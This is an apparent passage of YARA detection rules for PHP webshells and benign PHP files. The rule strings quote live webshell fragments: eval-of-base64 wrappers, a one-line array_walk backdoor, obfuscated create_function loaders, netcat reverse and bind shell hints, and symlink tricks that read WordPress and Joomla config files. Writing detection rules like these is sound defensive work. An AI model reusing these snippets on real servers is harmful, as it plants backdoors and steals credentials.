      1 of ($x*) and 4 of them
}

rule _github_forkme_blade
{
   meta:
      description = "php17 - file _github-forkme.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a7f11374a085e29c2f835884790cc3fb7871b28a4cf80db1d320964443d0c628"
   strings:
      $x1 = "<a target=\"_blank\" href=\"https://github.com/timegridio/timegrid\">" fullword ascii
      $s2 = "<img style=\"z-index:9999; position: absolute; top: 0; left: 0; border: 0; z-index:99999\" src=\"https://camo.githubusercontent" fullword ascii
      $s3 = "68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e70" ascii
      $s4 = "<img style=\"z-index:9999; position: absolute; top: 0; left: 0; border: 0; z-index:99999\" src=\"https://camo.githubusercontent." ascii
      $s5 = ".com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f66" ascii
      $s6 = "6f726b6d655f6c6566745f7265645f6161303030302e706e67\" alt=\"Fork me on GitHub\" data-canonical-src=\"https://s3.amazonaws.com/git" ascii
      $s7 = "ribbons/forkme_left_red_aa0000.png\">" fullword ascii
      $s8 = "@if (app()->environment('demo') || app()->environment('local'))" fullword ascii
      $s9 = "82b228a3648bf44fc1163ef44c62fcc6" ascii
   condition:
      uint16(0) == 0x6940 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule admin_menu_all_forms_html
{
   meta:
      description = "php17 - file admin-menu-all-forms.html.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25f2f013fc253e6af9e2b08bb0f67c9c99aa2e5d5879d8563d5b4eab3121f33a"
   strings:
      $s1 = "var_dump( $form->get_settings() );" fullword ascii
      $s2 = "$forms = Ninja_Forms()->form()->get_forms();" fullword ascii
      $s3 = "if( isset( $_GET['debug' ] ) ){" fullword ascii
      $s4 = "<?php do_action( 'nf_admin_before_form_list' ); ?>" fullword ascii
      $s5 = "<a href=\"<?php echo $add_new_url; ?>\" class=\"page-title-action\">" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 1KB and
      all of them
}

rule a5d39ae47f220af4efbcc67761903bd350c38a32
{
   meta:
      description = "php17 - file a5d39ae47f220af4efbcc67761903bd350c38a32.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5ea0fb667d701116b900e0dcaf3e6e9f58750db2e86bbfefa36064abd416fd68"
   strings:
      $x1 = "OS: <a style='color:7171C6;text-decoration:none;' target=_blank href='http://www.exploit-db.com/search/?action=search&filter" fullword ascii
      $x2 = "$res_t=\"<?php eval(gzuncompress(base64_decode(\\\"$res_t\\\"))); ?>\";" fullword ascii
      $x3 = "$res_t=\"<?php eval(gzinflate(base64_decode(\\\"$res_t\\\"))); ?>\";" fullword ascii
      $x4 = "$res_t=\"<?php eval(str_rot13(base64_decode(\\\"$res_t\\\"))); ?>\";" fullword ascii
      $x5 = "<tr><td><font color=red>PHP Reverse Shell</font> : <font color=green> nc -l -p <i>port</i></font></td></tr><tr><td><fo" fullword ascii
      $x6 = "print \"<b><font color=orange>Error :</font> <font color=red>Connection Timeout. Please Check The Target Hostname .</font" fullword ascii
      $x7 = "if(!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype']))" fullword ascii
      $x8 = "nt color=red>PERL Bind Shell</font> : <font color=green> nc <i>server_ip port</i></font></td></tr></table> </div>\";" fullword ascii
      $x9 = "symlink('/home/'.$usernamexx.'/public_html/blog/wp-config.php','Indrajith/'.$domainxx.' =>Wordpress2.txt');" fullword ascii
      $x10 = "<tr><td>URL <input size=50 name='rurlfile' value='ajithkp560.hostei.com/localroot/2.6.x/h00lyshit.zip'></td></tr>" fullword ascii
      $x11 = "symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php','Indrajith/'.$domainxx.' =>Joomla2.txt');" fullword ascii
      $x12 = "<tr><td style='text-align:left'> User Limits : <br /><br /><font color=7171C6><pre>\".cmd('ulimit -a').\"</pre></td></tr>\";" fullword ascii
      $x13 = "mail($email, \"Shell Accessed!!!\", $content_mail ,\"From:indrajith@shell.com\");" fullword ascii
      $x14 = "echo \"<tr><td>\".$user[0].\"</td><td><a href='AKP/root/home/\".$user[0].\"/public_html/' target=_blank>SymLink</tr>\";" fullword ascii
      $x15 = "OS: <a style='color:7171C6;text-decoration:none;' target=_blank href='http://www.exploit-db.com/search/?action=search&filter_pag" ascii
      $x16 = "echo \"<tr><td><a href=http://www.\".$akpzz[1][0].\" target=_blank>\".$akpzz[1][0].\"</a><td>\".$user['name'].\"</t" fullword ascii
      $x17 = "<tr><td style='text-align:left'> User Limits : <br /><br /><font color=7171C6><pre>\".cmd('ulimit -a').\"</pre></td>" fullword ascii
      $s18 = "symlink('/home/'.$usernamexx.'/public_html/support/configuration.php','Indrajith/'.$domainxx.' =>Whm3.txt');" fullword ascii
      $s19 = "symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php', \"INDRAJITH/\".$user.\" =>blog/configuration.php\");" fullword ascii
      $s20 = "d><td><a href='AKP/root/home/\".$user['name'].\"/public_html/' target=_blank>SymLink</a></td></tr></table>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_9248961d4e2785f2ae78fe69ed45090d468f7ae2
{
   meta:
      description = "php17 - file 9248961d4e2785f2ae78fe69ed45090d468f7ae2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d098f9e96c52ee68ce70eaaecc7f285bfb4ba7555e4bbf1bc6ecd273ace6d29"
   strings:
      $s1 = "$url = 'http://localhost/shell/index.php';" fullword ascii
      $s2 = "header('Content-type:text/html;charset=utf-8');" fullword ascii
      $s3 = "echo curl_exec($ch);" fullword ascii
      $s4 = "CURLOPT_HEADER => FALSE," fullword ascii
      $s5 = "$referer = \"a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_2011
{
   meta:
      description = "php17 - file 2011.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s13 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s14 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule AdminWxappValidate
{
   meta:
      description = "php17 - file AdminWxappValidate.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "58663961cf08b156edf2c02c1725cc76ddc08e4c4383835b0e19dd63ff36ab5e"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s3 = "< 449134904@qq.com>" fullword ascii
      $s4 = "// +----------------------------------------------------------------------" fullword ascii
      $s5 = "'app_secret.require' => '" fullword ascii
      $s6 = "'app_secret' => 'require'" fullword ascii
      $s7 = "namespace plugins\\wxapp\\validate;" fullword ascii
      $s8 = "// | Author: " fullword ascii
      $s9 = "App Secret" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_817302ad2600b261f1f45b2c67a86138
{
   meta:
      description = "php17 - file 817302ad2600b261f1f45b2c67a86138.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5ccd08cbede6084e038334211ad9a744efca4bab0464685cb0538516202f9182"
   strings:
      $s1 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s2 = "+g20O23YvrnxiRCMRh7LNGpypSixPEQpH/7xDkwsrxKRQpLf90rdINR42ud2lW/v4vjpNvLGHRh0GGqi/G72e9h46n3aJnoFZKQda/wgxGBj2dSjvxMa3+Hg5SrN9Thy" ascii
      $s3 = "EGPmwbdBrtwROjp3ArrAnT049lOuCf+en2ymN/RUQ6t349eaH6wCzKz0qGU7sYOjinYaNz3KzYWWNIKn2f7B0vKRQMLPO4SqrBs47X4AQyGELUD8DYEt9GPWxFtPPSUZ" ascii
      $s4 = "RSIoP5HG/PJ0pB6GsCfXlWoa96bjQh3dNUpHfMa+UUoOpZJ1u95ZApicDOWK7RK3Oc/nGetEfDk1vHnuWJJs3PdM4NA0YxAX1d3Gyw2fVcZtcuk4YSVDRr9th8504fWE" ascii
      $s5 = "jTAncF0sFFJ4GulNQybqL/h7d4oE3CsD5tEoyNqrqO/07MtXZA5U/j4a8/umYlPeLO11drBspYC/Wth8J9LYp81DMGHc1FsrwyGMP0d8CzQ4C6E1fplDEolfYCetfxGg" ascii
      $s6 = "JMOPuVZ/R8t3nsEpDpjIHDYwf66n5IfFGmKvlOGSeUCGZxzyuqV16Z/y+Tg914YNG57k5OM4ZglKeU/s32UJgghBanZEhNGt1fukmmL1+3emuFk+Pfh1mf1Z6VbxrUtk" ascii
      $s7 = "olRG4pRiEUCEvhvv6VzHApvbMTAM/tE4rg7U42XbmhjfRXmxsUggccjn8Jy/IR74SBdMDM525oh3iRvwVZQ+cobcUAJgHl8As9wQTgmYDlLh4fMzrq3qgkA6cTjqSsdp" ascii
      $s8 = "qCCbUFJkPOYdivro3xs0LKcN+picczDeL7S3SAZW3bLCcyezUmFYIjD53HJohCLOg6DyNgkDm8IOwaXxSW/V7OH+RywuOcLfIk+aOTtxrO9E1BAO+5iSS5qE41cLhpch" ascii
      $s9 = "GfwAvhyY+Epk4GyBNFvF5DLLlg2QVxiLSEoe/bZZZZvvBEqg+9IzhpDx32TE85Tc6VcY7jacf6Dk1e2vxwo3/jzzVwy/9vAVPxNneaojfvQfoV1YvOSl8AtTrXY+eXe7" ascii
      $s10 = "8qlADy6Wm+jbE8dLLqgdwOKYcIsj/DC/D6rIohpEBNRh5Tidrw4eIIWBwjsPcYDeTRrPXV/bBWzhGzhEs+9qmBv2JvLYlvQ/G6lnOhbnLjsBsEFxiyq+DpaDky6V29wE" ascii
      $s11 = "A5WNQvT44POAvKGeTIZSxulf0fmkGyw1AnR8LXwBD7I0BeEAO0Q42aIvrfq5JhYS1MiHOOHV5cdSZAWGHnDrojNwQtji4OTrnwglFh6+BPjHQxWmoE3y+rTeFnN7V+Sb" ascii
      $s12 = "k8oEH+fbitOX48mXsZESBEm0AsHneUAQWEAQtP5+KpBh/v3v//7nn3/+9V//+d//+c//AQ=='))); ?>" fullword ascii
      $s13 = "v4BntA+GknI88Cx1oCMDXgIzv/3Om9uBysqCSdrwB0z4AWpuNtZzUFlugbVdRL/buKaBXLxLruxvw//OGpDyRKy7dyWVKraJHRjDXsaSPbBbJ36qpZoTXx7G57Q9BCUe" ascii
      $s14 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s15 = "p/896pM/UvlxnRVVUbBINz9mfuTX9pdCq+Nrsy4Wrxl+XGoaYcdrslH3svGhrFz3cZ7PE2VzJumm9AgvSgT7IpfNz6QQ45dO8emZ0dbbIzHdVQCD+oU8G2GCpOCHCkeg" ascii
      $s16 = "UmFqzP5BAIh+3YFpcMZCCUll4hgTt82tfZKK+kwTrgIkBab0GidR80sgfWnklFxVJ3TV4M9H3NsUmv3JK2RTTei+O4Nf+MQtqyEsoqk+zQaTAdr4/a7Bh0Xrunn/X/w0" ascii
      $s17 = "kiJ3I7ZAExmpEWeQVvfPjlBgvIFXQNS9n1pmR808xFIE6p7zcih8Njx2VJQbinVQBcQyXyy0pn/9NV2g0mwNlWFDrhcfpy8HGY8f6f5Qd5zFHTuqRy3P82XHbwkRSJD5" ascii
      $s18 = "tCL7ZcQ9l5hBFtZI0hXTHqaX+kIycyPa5nGM5r6yxeZH/NK+sPABINJgmbPLV2L64a7BYe/V6iTctIqTFPyohGCc0MZ+20orzVA5/aFex6of63XGd8WxELwfPyrnvCNJ" ascii
      $s19 = "QKOa0sGSUZxEtTfybInSou0KLDD957zCIKct417R4867/ApG6J0DWASE3qUDYqKTvM4jBHKEUKCFUVJQPA80uz59mWhRBYb1j/9gO/DgYgP0J0K42TP65PhUWCh3W/Ge" ascii
      $s20 = "VZu7Ieyw4z8sauhj7Gt204ud6FXhgBZCkbiNA55yANXCqQ9uLL8VK9NEigyaLdrV7mhONhzmD/lFBLQebglZkFHc7VtqjZvyzUhEQzneNma4Atbxsr10mVh8NTpQ2Ly9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_1f7c45520b6164f19f42c7cbb8c8207bfba38757
{
   meta:
      description = "php17 - file 1f7c45520b6164f19f42c7cbb8c8207bfba38757.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "84f450bcdf9d7205ff108446b61420cbddc652ad847ef9d20828c5b84113f3ae"
   strings:
      $s1 = "EUXCDrGfm5nOCmy0qUX7tNocV0/buwD1NFq6ZeXXtQJYkIbPbyzto+MLvvvc88lnLe8i61UAoQttcIOcnHeSflvn/scI4cQOLlXMI//0P\";" fullword ascii
      $s2 = "SCdA91B7a1hB8RS3xWHIXdY6T9TwCc0xRi3IZGTB74VSs6rLkrXVm0jVjjQNstEz3DCNOpVy3Xk91cVJxbaOKEbFvrQCy2fxSUzhanvPq5bmccNWTPG3UbMsXoPWSS5T" ascii
      $s3 = "TN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQ" ascii
      $s4 = "0VkC5F6c7eSxl6n8/pudIYGl89MitzIHEuXxVYD3J+qt9oQ4PJqsQjEOewetHZEUf8UCRYjHw7vmxoe0Bjtx59p4PftRrDqXDRXTLqQ1NGLVE613PVZmyaiRe6SnV9b8" ascii
      $s5 = "K3XNhcc7Cy92cVYW3WsVZpSzZCVEopMlUun/XlOFzTWnVpt8ShAFmZsxVB3sNWkvLAUSxdyhWMgea1yH4jJVBb3QaAFPrxU3v6VD7DsFpOCVxSwRZsTFsw6Ga1qFmVUx" ascii
      $s6 = "Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA" ascii
      $s7 = "Yt2qMvkz6XUVfFvNfbAQctL9EMm5ymPhQFhFsxHbofsVxNANVi11IbkMPbEiq8ZkJV5c/dT9VfSXSJ020uiyOJC2k5CsrZfpjgT5PN9tFxmpLPqHyUj4dTimrr6CXpOA" ascii
      $s8 = "ciVMRmVAJy1LjHrtATOXlG/b7ovl+MjCsWg4dRxrAUBm89LxSavrJhvKKX7G6gOU0BJPgEwPlujSgaTgOTzldM3D7J2dJ4SuT8G+oggqmqcxMsqoSJKCH79svbp+CPic" ascii
      $s9 = "dUE8GzeuLXbI0WiI/zRT7snWMV7vXc0BLFwQvIfSYKjgtoIiKJO8reFV4ahnMA1JRdKx1HMiyyMoZnMgQX7W2Jb4/tudaDRtJOUgZY5FAFbpEnYQiABEU5E+XyKu3pqR" ascii
      $s10 = "qQlz0aqMXesslvqz7Y4baL0WvNHvflRnLNxLR5IFfb9KrZT97Lotz8OFtJJj9ugSFhVYy9nzcuRvC+vbF6zdrWpYtPek+rxjaeMog4pvOIbJ3wOTQmFb3d/atN9HV7Zs" ascii
      $s11 = "gj/m8KIA/iX+Du8jOjfwv8m1Oit/Gjxfs5XYSyR7wZ9sdiLPaiE7rxwYZvDz3z0G0fN9Pt1PqiDLuyRgzA7sVpo2NvL3Cdy6p1eSS3Um21eZqfW2uc6Xc9STYjG0E8zy" ascii
      $s12 = "izh676B29Ssyk1ZZcZwLKwlms5igcnOp1+1ekSSQK9Lv0S2ZnH92jrgEbjN0b9dO44OK4Z4mIc2VxoxxZepzO+WLzcJrra8wYG5RKqDNe3w+ODQnrPzk+OyZo+z8kL8H" ascii
      $s13 = "czLtwDdD02SRAXQye+iJVzeXw5oBXLm+UcI10xPq0vErmx/6sNPUD2cyMX2Smn2sJT8wbBHoQgSXoeEMDDW4asQ+EfKz22/qsUIar/RGur4+H/zBYG1sSvfF1285xHiC" ascii
      $s14 = "S3tV9WjJkhkxZAMaHLA7+0NJ7dy9abkmqhppR9oAYIJM9g3OHTD+8+wQtkYMCiHSxQxMEzWvkktKPzgskfd/F3m4WH09lAfUtThQ+JA2pMvbnJ6t8SLwdtzXvR47Ze0Z" ascii
      $s15 = "kwm9MbSA0CXS3d5zRMlX8AmlTkoGVVyv1tQGGJHxrNE5UOwzv8nu+rRSRdvFdudsY/sMnYMZnsrOpaizSBDSasH8KfVzC4DLUqiLNIrG6sliU6qPL05PxIlKz4nRJHEh" ascii
      $s16 = "oChI5Ts9i2Xxps8UaZmK1GRKu7eeu0xVdYR0XvceH2R6uyCoey0/sno674EXEeeNr411sBJiLsNR8KPlWHB7pI6EyxDiK4TQt53ZPzD/rbOTgmULB65lQFoNnmc4taOL" ascii
      $s17 = "KwjDxldWNp9wx7zux2sY0uWUABDxUQWhoG2Dt8WlOYIuH8fjpej0l0Ag3k01AHYyLNNo7exzAS7jczTk5oogzNlETVL5g2TcLYQI7n5y+9dRXzgN4z19fKr4mPCsLm+Z" ascii
      $s18 = "K51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2" ascii
      $s19 = "TTvo/W8LsiZ6Sdzdm2qGSqJapvuncb/jlI1c4i60NN53TasogwL0a/GFnyF4lgiGXW2N7BNyL5EEyQA42LdZtao2S9f+reA04QDbaEQtRg0YRlb/E0ksyci4MM1HlVvv" ascii
      $s20 = "uZFAIRngh0oVQKZXb+fgBOdQNKnDsVQvjnz/8=\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}


rule ActionCustomSettings
{
   meta:
      description = "php17 - file ActionCustomSettings.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f406c5d443191a9fcb59900bffe3ef73b162b7f005c2d77721da61a69c140174"
   strings:
      $s1 = "* TAG" fullword ascii
      $s2 = "<?php if ( ! defined( 'ABSPATH' ) ) exit;" fullword ascii
      $s3 = "'label' => __( 'Hook Tag', 'ninja-forms' )," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4999d6daf643df7d50531b881369cc4c1f43100f
{
   meta:
      description = "php17 - file 4999d6daf643df7d50531b881369cc4c1f43100f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f7b09812ba06c44e5064513f0b185d357c5b8789debf81f380cee2e85c064bb"
   strings:
      $s1 = "a4c4'][47].$GLOBALS['ye5eca4c4'][94].$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][2].$GLOBALS['ye5eca4c4'][40]] = $_COOKIE;" fullword ascii
      $s2 = "a4c4'][46].$GLOBALS['ye5eca4c4'][73].$GLOBALS['ye5eca4c4'][29].$GLOBALS['ye5eca4c4'][89]] = $_POST;" fullword ascii
      $s3 = "for ($q114025=0; $q114025<$GLOBALS[$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][39].$GLOBALS['ye5eca4c4'][81].$GLOBALS['y" fullword ascii
      $s4 = "for ($sea8f929=0; $sea8f929<$GLOBALS[$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][39].$GLOBALS['ye5eca4c4'][81].$GLOB" fullword ascii
      $s5 = "foreach ($GLOBALS[$GLOBALS['ye5eca4c4'][86].$GLOBALS['ye5eca4c4'][37].$GLOBALS['ye5eca4c4'][69].$GLOBALS['ye5eca4c4'][81].$G" fullword ascii
      $s6 = "return $GLOBALS[$GLOBALS['ye5eca4c4'][27].$GLOBALS['ye5eca4c4'][47].$GLOBALS['ye5eca4c4'][39].$GLOBALS['ye5eca4c4'][74]]($GL" fullword ascii
      $s7 = "echo @$GLOBALS[$GLOBALS['ye5eca4c4'][19].$GLOBALS['ye5eca4c4'][40].$GLOBALS['ye5eca4c4'][37].$GLOBALS['ye5eca4c4'][73].$" fullword ascii
      $s8 = "ye5eca4c4'][21].$GLOBALS['ye5eca4c4'][27].$GLOBALS['ye5eca4c4'][86].$GLOBALS['ye5eca4c4'][20].$GLOBALS['ye5eca4c4'][81];" fullword ascii
      $s9 = "$GLOBALS['ye5eca4c4'][10].$GLOBALS['ye5eca4c4'][19] => @$GLOBALS[$GLOBALS['ye5eca4c4'][66].$GLOBALS['ye5eca4c4'][47]" fullword ascii
      $s10 = "$nf6c9e .= $GLOBALS[$GLOBALS['ye5eca4c4'][14].$GLOBALS['ye5eca4c4'][49].$GLOBALS['ye5eca4c4'][47].$GLOBALS['ye5eca4c" fullword ascii
      $s11 = "$GLOBALS['ye5eca4c4'][75].$GLOBALS['ye5eca4c4'][19] => $GLOBALS['ye5eca4c4'][29].$GLOBALS['ye5eca4c4'][87].$GLOBALS[" fullword ascii
      $s12 = "5eca4c4'][14].$GLOBALS['ye5eca4c4'][29].$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][21];" fullword ascii
      $s13 = "[39].$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][74].$GLOBALS['ye5eca4c4'][49]]($t6a31a); $sea8f929++, $q114025++)" fullword ascii
      $s14 = "46\\x42\\x2a\\x69\\x2e\\x2c\\x39\\x3d\\x20\\x55\\x45\\x34\\x26\\x47\\x59\";" fullword ascii
      $s15 = "e5eca4c4'][1].$GLOBALS['ye5eca4c4'][24].$GLOBALS['ye5eca4c4'][1].$GLOBALS['ye5eca4c4'][75], 0);" fullword ascii
      $s16 = "ca4c4'][37].$GLOBALS['ye5eca4c4'][38].$GLOBALS['ye5eca4c4'][81].$GLOBALS['ye5eca4c4'][40]](0);" fullword ascii
      $s17 = ".$GLOBALS['ye5eca4c4'][21].$GLOBALS['ye5eca4c4'][73].$GLOBALS['ye5eca4c4'][2]]()," fullword ascii
      $s18 = "GLOBALS['ye5eca4c4'][69].$GLOBALS['ye5eca4c4'][2].$GLOBALS['ye5eca4c4'][29]]($q114025);" fullword ascii
      $s19 = "elseif ($t6a31a[$GLOBALS['ye5eca4c4'][21]] == $GLOBALS['ye5eca4c4'][81])" fullword ascii
      $s20 = "LS['ye5eca4c4'][66].$GLOBALS['ye5eca4c4'][86].$GLOBALS['ye5eca4c4'][48];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_97c9066b797f92874fa72523d0cd22759b1d6bc8
{
   meta:
      description = "php17 - file 97c9066b797f92874fa72523d0cd22759b1d6bc8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "72da4acca30183c889223baa546a6d1892f254c3c3f791fc46e994da5622efca"
   strings:
      $s1 = "$e = $_REQUEST['e']; $arr = array($_POST['pass'] => '|.*|e',); array_walk($arr, $e, '');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule aa8fc9161c7f94050e92a4abbdb948b750e174b3
{
   meta:
      description = "php17 - file aa8fc9161c7f94050e92a4abbdb948b750e174b3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8604b338c8e0d9c6f4f2729b119f904e1ebfaef344140dca1a2dec3b34ed92ed"
   strings:
      $s1 = "$r='Mmart()Mm;@eMmval(@gzuMmncomMmpMmresMmsMm(@x(@baMmse64_decode(preg_MmreplacMmeMm(array(\"/_/\",\"/Mm-Mm/\"),arr';" fullword ascii
      $s2 = "$f='aMmy(\"/\",\"+\"Mm),$ss($sMm[Mm$i],0Mm,$e))),$k)Mm));$o=oMmb_get_cMmonteMmnts();obMm_endMm_cleaMmMmn();Mm';" fullword ascii
      $s3 = "$d='t();MmMm$s=&$_MmSESSION;$ss=Mm\"subsMmtr\";$Mmsl=Mm\"strtoloMmwer\";$iMm=$m[1][Mm0].$m[Mm1]Mm[1];Mm$h=$sl($ssMm(md5($';" fullword ascii
      $s4 = "$c='$d=basMmMme64_encode(x(gzcompreMmss(Mm$o),$k)Mm);MmpMmrint(\"<$k>$d</$kMm>\");@sMmession_dMmesMmtroy();}}}}';" fullword ascii
      $s5 = "$s='EMmRVER;$rMmr=@$r[Mm\"HTTP_MmREMmFEMmRER\"];Mm$rMma=@$r[\"HTTPMm_MmACCEPMmT_LANGUAGE\"];if($rMmr&Mm&$M';" fullword ascii
      $s6 = "$P='r($iMm=0Mm;$iMm<$lMm;)Mm{for($j=0Mm;($j<$c&&Mm$i<$l);$j++,$i++)MmMm{MmMm$o.=$t{$i}^$kMm{$jMmMm};}}return $o;}$r=$_S';" fullword ascii
      $s7 = "$e='$kh=\"5d41\"MmMm;$kf=\"402a\";MmfunctiMmon x($tMm,$kMm){$c=strlMmenMmMm($k);$lMm=sMmtrlen($t);$o=Mm\"\";fo';" fullword ascii
      $s8 = "$E='cMmh_allMm(\"/([\\\\w])[\\\\wMm-Mm]+(?:;q=0.([Mm\\\\d]))?Mm,?/\",Mm$ra,$m)Mm;if($qMm&&$m)Mm{@sessiMmonMm_star';" fullword ascii
      $s9 = "$S='MmkeMmy_exMmiMmsts($Mmi,$s)){$s[$i].=$pMm;$Mme=strpos($s[$iMm],$f)Mm;iMmf($e){$Mmk=$kh.$kMmf;ob_st';" fullword ascii
      $s10 = "$j='mra){$u=parse_Mmurl($rr);pMmarMmse_sMmtr($u[\"querMmy\"]Mm,$q)Mm;$q=Mmarray_valuMmes($q);pMmMmreg_mat';" fullword ascii
      $s11 = "$O='i.$MmMmkh),0,Mm3)Mm);Mm$Mmf=Mm$sl($ss(md5($i.$kf),Mm0,3)MmMm);$p=\"\";for($Mmz=Mm1;$z<count($m[1]);$Mmz';" fullword ascii
      $s12 = "$k='Mm++)$Mmp.=$q[$m[2][$Mmz]];iMmf(strpos(Mm$p,$hMm)==MmMm=0){$s[$i]Mm=\"\";$p=$ssMm($Mmp,3);}iMmf(array_';" fullword ascii
      $s13 = "$N=str_replace('Mm','',$e.$P.$s.$j.$E.$d.$O.$k.$S.$r.$f.$c);" fullword ascii
      $s14 = "$a=str_replace('rI','','crrIrIearIte_rIfunrIcrItion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_22heavilyformatted
{
   meta:
      description = "php17 - file 22heavilyformatted.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b13ae4614e6cec6cbd66133e7c8bacf9fc3a5ff5fccaf31cac6a9545e16c135"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
